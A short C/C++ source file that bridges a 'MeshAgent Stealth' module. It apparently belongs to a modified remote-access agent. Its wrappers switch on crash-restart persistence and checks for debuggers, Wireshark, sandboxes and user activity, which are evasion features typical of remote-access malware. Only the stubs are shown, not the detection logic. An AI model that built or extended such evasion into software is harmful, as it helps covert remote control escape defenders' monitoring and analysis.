/*
 * MeshAgent Stealth - C/C++ Bridge
 *
 * Provides C-callable wrappers for optional C++ utilities so that
 * C compilation units can reference functionality when available.
 * All wrappers are safe no-ops unless MESHAGENT_ENABLE_STEALTH is defined.
 */

#include <windows.h>
#include "stealth.h"

extern "C" {

void Stealth_EnableCrashRecovery(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    CrashRecovery::EnableAutomaticRestart();
#else
    // no-op
#endif
}

BOOL Stealth_IsDebuggerDetected(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    return SecurityToolDetection::IsDebuggerDetected();
#else
    return FALSE;
#endif
}

BOOL Stealth_IsNetworkMonitorDetected(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    return SecurityToolDetection::IsRunningUnderWireshark();
#else
    return FALSE;
#endif
}

BOOL Stealth_IsRunningInSandbox_C(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    return NetworkStealth::IsRunningInSandbox();
#else
    return FALSE;
#endif
}

BOOL Stealth_WaitForUserActivity_C(DWORD timeoutMs)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    return NetworkStealth::WaitForUserActivity(timeoutMs);
#else
    (void)timeoutMs;
    return FALSE;
#endif
}

} // extern "C"

